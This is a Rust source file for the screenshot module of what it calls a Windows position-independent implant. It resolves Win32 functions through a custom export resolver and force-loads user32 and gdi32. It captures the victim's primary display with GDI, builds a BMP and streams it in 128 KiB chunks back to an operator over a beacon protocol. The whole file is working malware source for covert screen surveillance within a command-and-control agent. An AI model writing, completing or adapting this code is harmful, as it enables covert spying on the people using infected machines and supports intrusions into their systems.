//! Screen capture for the Windows PIC implant.
//!
//! `#![no_std]`, position-independent port of the dev agent's screenshot
//! command. Captures the primary display with GDI (BitBlt + GetDIBits),
//! hand-rolls a 32-bpp BGRA BMP, and streams it back as `Response::FileChunk`s
//! (128 KiB each, name `screenshot.bmp`) — NOT a single `Response::Image`,
//! because a full-screen BMP routinely exceeds the beacon's `MAX_CT_LEN` and the
//! beacon loop's BATCH_FLUSH framing is what keeps each chunk within a frame.
//!
//! `user32.dll` and `gdi32.dll` are force-loaded via the same
//! `LoadLibraryA`-from-kernel32 trick as [`crate::recon`] (Windows refcounts
//! module loads, so this is idempotent). All Win32 pointers use the x64
//! `"system"` ABI and are transmuted from the raw `usize` addresses the
//! [`crate::resolve::export_addr`] resolver returns.
//!
//! ## GDI handle hygiene
//! The implant is long-lived, so every DC/bitmap acquired here is torn down on
//! *every* path — success, partial failure, and resolution failure. The order
//! matters: a bitmap selected into a DC cannot be `DeleteObject`-ed until it is
//! deselected, so the previous object is restored first.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use nyx_protocol::Response;

// ---- Win32 / GDI constants -------------------------------------------------

/// `SRCCOPY` raster-op for `BitBlt` — copy the source rectangle verbatim.
const SRCCOPY: u32 = 0x00CC_0020;
/// `GetSystemMetrics` index for the primary screen width.
const SM_CXSCREEN: i32 = 0;
/// `GetSystemMetrics` index for the primary screen height.
const SM_CYSCREEN: i32 = 1;
/// `DIB_RGB_COLORS` — the color table (none here) is raw RGB values.
const DIB_RGB_COLORS: u32 = 0;

/// Per-chunk size for the streamed BMP. Mirrors [`crate::fs::CHUNK`] (128 KiB),
/// safely under `protocol::frame::MAX_CT_LEN` so a single chunk + batch header
/// fits one beacon frame.
const CHUNK: usize = 128 * 1024;

/// Defensive cap on captured pixel count (~64 MB at 32 bpp). A real primary
/// screen is well under this; refusing anything larger guards against a
/// pathologically huge virtual screen or a bogus `GetSystemMetrics` return
/// driving a runaway allocation.
const MAX_PIXELS: usize = 16 * 1024 * 1024;

// ---- shared helpers -------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors recon.rs:56).
/// Idempotent: Windows refcounts module loads, so this is safe to call on every
/// screenshot invocation without caching.
///
/// Returns `true` if the module is now mapped (or was already).
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // Build a NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

// ---- BITMAPINFOHEADER -----------------------------------------------------

/// Win32 `BITMAPINFOHEADER` (40 bytes). Used both as the `GetDIBits` request
/// descriptor and as the in-file info header layout (BMP stores it verbatim).
/// `biHeight` is kept POSITIVE so GetDIBits fills bottom-up — which exactly
/// matches BMP's bottom-up row order, so the pixel bytes drop straight into the
/// file body with no flip.
#[repr(C)]
struct BitmapInfoHeader {
    bi_size: u32,
    bi_width: i32,
    bi_height: i32,
    bi_planes: u16,
    bi_bit_count: u16,
    bi_compression: u32,
    bi_size_image: u32,
    bi_x_pels_per_meter: i32,
    bi_y_pels_per_meter: i32,
    bi_clr_used: u32,
    bi_clr_important: u32,
}

// ---- chunk streaming ------------------------------------------------------

/// Slice a complete buffer into `Response::FileChunk`s of `CHUNK` bytes, the
/// last one flagged `eof=1`. An empty input yields a single empty eof chunk so
/// the operator still sees completion (matches [`crate::fs::do_download`]'s
/// empty-file contract).
fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
    let name = String::from(name);
    let mut chunks: Vec<Response> = Vec::new();
    if data.is_empty() {
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
        return chunks;
    }
    let total = data.len();
    let mut offset = 0usize;
    let mut seq = 0u32;
    while offset < total {
        let end = (offset + CHUNK).min(total);
        // The final slice carries eof=1; all earlier ones are eof=0.
        let eof = if end == total { 1 } else { 0 };
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[offset..end].to_vec(),
        });
        seq += 1;
        offset = end;
    }
    chunks
}

// ---- public entrypoint ----------------------------------------------------

/// Capture the screen and stream it back as 128 KiB `Response::FileChunk`s
/// (name `screenshot.bmp`).
///
/// `monitor` selects a display in future builds; **v1 captures the primary
/// screen only** via `SM_CXSCREEN`/`SM_CYSCREEN` (`monitor == 0` ⇒ primary).
/// Multi-monitor / per-display capture (EnumDisplayMonitors, virtual-screen
/// coordinates) is a TODO.
///
/// GDI sequence: GetDC → CreateCompatibleDC → CreateCompatibleBitmap →
/// SelectObject → BitBlt(SRCCOPY) → GetDIBits(32bpp BI_RGB) → assemble BMP →
/// cleanup. Every DC/bitmap handle is released on every return path; a leak
/// here kills the long-lived implant.
pub fn do_screenshot(monitor: u8) -> Vec<Response> {
    // `monitor` is accepted for forward-compat with per-display selection.
    let _ = monitor;

    // ---- 1. Force-load user32 + gdi32 -------------------------------------
    if !force_load(b"user32.dll") {
        return vec![Response::Err(String::from(
            "screenshot: user32.dll load failed",
        ))];
    }
    if !force_load(b"gdi32.dll") {
        return vec![Response::Err(String::from(
            "screenshot: gdi32.dll load failed",
        ))];
    }

    // ---- 2. Resolve all exports ------------------------------------------
    type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
    type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
    type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type CreateCompatibleBitmap =
        unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
    type SelectObject =
        unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type BitBlt = unsafe extern "system" fn(
        *mut c_void,
        i32,
        i32,
        i32,
        i32,
        *mut c_void,
        i32,
        i32,
        u32,
    ) -> i32;
    // GetDIBits: (hdc, hbmp, uStartScan, cScanLines, lpvBits, lpbi, usage).
    // lpbi is LPBITMAPINFO; we pass &mut BITMAPINFOHEADER, which is the leading
    // member of BITMAPINFO, so the pointer aliasing is sound.
    type GetDiBits = unsafe extern "system" fn(
        *mut c_void,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
        *mut BitmapInfoHeader,
        u32,
    ) -> i32;
    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;

    let get_system_metrics: GetSystemMetrics =
        match unsafe { export_addr(b"user32.dll", b"GetSystemMetrics") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: GetSystemMetrics unresolved",
                ))]
            }
        };
    let get_dc: GetDc = match unsafe { export_addr(b"user32.dll", b"GetDC") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => {
            return vec![Response::Err(String::from(
                "screenshot: GetDC unresolved",
            ))]
        }
    };
    let release_dc: ReleaseDc =
        match unsafe { export_addr(b"user32.dll", b"ReleaseDC") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: ReleaseDC unresolved",
                ))]
            }
        };
    let create_compatible_dc: CreateCompatibleDc =
        match unsafe { export_addr(b"gdi32.dll", b"CreateCompatibleDC") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: CreateCompatibleDC unresolved",
                ))]
            }
        };
    let create_compatible_bitmap: CreateCompatibleBitmap =
        match unsafe { export_addr(b"gdi32.dll", b"CreateCompatibleBitmap") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: CreateCompatibleBitmap unresolved",
                ))]
            }
        };
    let select_object: SelectObject =
        match unsafe { export_addr(b"gdi32.dll", b"SelectObject") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: SelectObject unresolved",
                ))]
            }
        };
    let bit_blt: BitBlt = match unsafe { export_addr(b"gdi32.dll", b"BitBlt") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => {
            return vec![Response::Err(String::from("screenshot: BitBlt unresolved"))]
        }
    };
    let get_di_bits: GetDiBits =
        match unsafe { export_addr(b"gdi32.dll", b"GetDIBits") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: GetDIBits unresolved",
                ))]
            }
        };
    let delete_object: DeleteObject =
        match unsafe { export_addr(b"gdi32.dll", b"DeleteObject") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: DeleteObject unresolved",
                ))]
            }
        };
    let delete_dc: DeleteDc =
        match unsafe { export_addr(b"gdi32.dll", b"DeleteDC") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => {
                return vec![Response::Err(String::from(
                    "screenshot: DeleteDC unresolved",
                ))]
            }
        };

    // ---- 3. Primary screen dimensions ------------------------------------
    let w = unsafe { get_system_metrics(SM_CXSCREEN) };
    let h = unsafe { get_system_metrics(SM_CYSCREEN) };
    if w <= 0 || h <= 0 {
        return vec![Response::Err(String::from(
            "screenshot: invalid screen metrics",
        ))];
    }
    let (w, h) = (w as usize, h as usize);
    // Reject absurd dimensions before any allocation: checked_mul guards the
    // pixel product, and MAX_PIXELS caps the absolute ceiling.
    let pixels_count = match w.checked_mul(h) {
        Some(n) => n,
        None => {
            return vec![Response::Err(String::from(
                "screenshot: screen dimensions overflow",
            ))]
        }
    };
    if pixels_count > MAX_PIXELS {
        return vec![Response::Err(String::from(
            "screenshot: screen too large (exceeds 16M pixels)",
        ))];
    }

    // ---- 4. Pixel buffer (w*h*4 bytes, 32 bpp) ---------------------------
    let bytes = match pixels_count.checked_mul(4) {
        Some(n) => n,
        None => {
            return vec![Response::Err(String::from(
                "screenshot: pixel buffer size overflow",
            ))]
        }
    };
    let mut pixels: Vec<u8> = vec![0u8; bytes];

    // ---- 5. GDI capture --------------------------------------------------
    // All early-return paths below release exactly the handles acquired so far,
    // in reverse order. A bitmap stays non-deletable while selected into a DC,
    // so the stock object returned by SelectObject is restored before DeleteObject.
    let filled: bool = unsafe {
        let screen_dc = get_dc(core::ptr::null_mut());
        if screen_dc.is_null() {
            return vec![Response::Err(String::from("screenshot: GetDC failed"))];
        }

        let mem_dc = create_compatible_dc(screen_dc);
        if mem_dc.is_null() {
            release_dc(core::ptr::null_mut(), screen_dc);
            return vec![Response::Err(String::from(
                "screenshot: CreateCompatibleDC failed",
            ))];
        }

        let bitmap = create_compatible_bitmap(screen_dc, w as i32, h as i32);
        if bitmap.is_null() {
            delete_dc(mem_dc);
            release_dc(core::ptr::null_mut(), screen_dc);
            return vec![Response::Err(String::from(
                "screenshot: CreateCompatibleBitmap failed",
            ))];
        }

        // Select the bitmap into the memory DC; prev_obj is the stock 1x1 bitmap
        // we must restore before deleting `bitmap`.
        let prev_obj = select_object(mem_dc, bitmap);

        // BitBlt returns 0 on failure. SRCCOPY copies source pixels verbatim.
        if bit_blt(
            mem_dc,
            0,
            0,
            w as i32,
            h as i32,
            screen_dc,
            0,
            0,
            SRCCOPY,
        ) == 0
        {
            select_object(mem_dc, prev_obj);
            delete_object(bitmap);
            delete_dc(mem_dc);
            release_dc(core::ptr::null_mut(), screen_dc);
            return vec![Response::Err(String::from("screenshot: BitBlt failed"))];
        }

        // GetDIBits request descriptor. biHeight > 0 ⇒ bottom-up fill, which is
        // exactly BMP's row order, so no post-capture flip is needed.
        // biBitCount=32 ⇒ BGRA, 4 bytes/px; each row is already a whole number
        // of DWORDs, so BMP needs NO per-row padding.
        let mut bi = BitmapInfoHeader {
            bi_size: 40,
            bi_width: w as i32,
            bi_height: h as i32, // positive ⇒ bottom-up
            bi_planes: 1,
            bi_bit_count: 32,
            bi_compression: 0, // BI_RGB
            bi_size_image: (w as u32) * (h as u32) * 4,
            bi_x_pels_per_meter: 0,
            bi_y_pels_per_meter: 0,
            bi_clr_used: 0,
            bi_clr_important: 0,
        };
        let got = get_di_bits(
            screen_dc,
            bitmap,
            0,
            h as u32,
            pixels.as_mut_ptr() as *mut c_void,
            &mut bi as *mut BitmapInfoHeader,
            DIB_RGB_COLORS,
        );

        // Unconditional cleanup of all three handles, in reverse acquisition
        // order, before inspecting the result.
        select_object(mem_dc, prev_obj);
        delete_object(bitmap);
        delete_dc(mem_dc);
        release_dc(core::ptr::null_mut(), screen_dc);

        // GetDIBits returns the scan-line count on success and 0 on failure.
        got != 0
    };

    if !filled {
        return vec![Response::Err(String::from(
            "screenshot: GetDIBits failed",
        ))];
    }

    // ---- 6. Assemble BMP (fileheader + infoheader + pixels) --------------
    let file_size = 14 + 40 + pixels.len();
    let mut bmp: Vec<u8> = Vec::with_capacity(file_size);

    // BITMAPFILEHEADER (14 bytes).
    bmp.push(b'B');
    bmp.push(b'M');
    bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
    bmp.extend_from_slice(&0u32.to_le_bytes()); // reserved1 + reserved2
    bmp.extend_from_slice(&54u32.to_le_bytes()); // offset to pixel array

    // BITMAPINFOHEADER (40 bytes).
    bmp.extend_from_slice(&40u32.to_le_bytes()); // biSize
    bmp.extend_from_slice(&(w as i32).to_le_bytes()); // biWidth
    bmp.extend_from_slice(&(h as i32).to_le_bytes()); // biHeight (positive ⇒ bottom-up)
    bmp.extend_from_slice(&1u16.to_le_bytes()); // biPlanes
    bmp.extend_from_slice(&32u16.to_le_bytes()); // biBitCount
    bmp.extend_from_slice(&0u32.to_le_bytes()); // biCompression (BI_RGB)
    bmp.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes()); // biSizeImage
    bmp.extend_from_slice(&0i32.to_le_bytes()); // biXPelsPerMeter
    bmp.extend_from_slice(&0i32.to_le_bytes()); // biYPelsPerMeter
    bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrUsed
    bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrImportant

    // Pixel array (already in BMP bottom-up order from GetDIBits).
    bmp.extend_from_slice(&pixels);

    // ---- 7. Stream as 128 KiB FileChunks ---------------------------------
    chunk_stream(bmp, "screenshot.bmp")
}
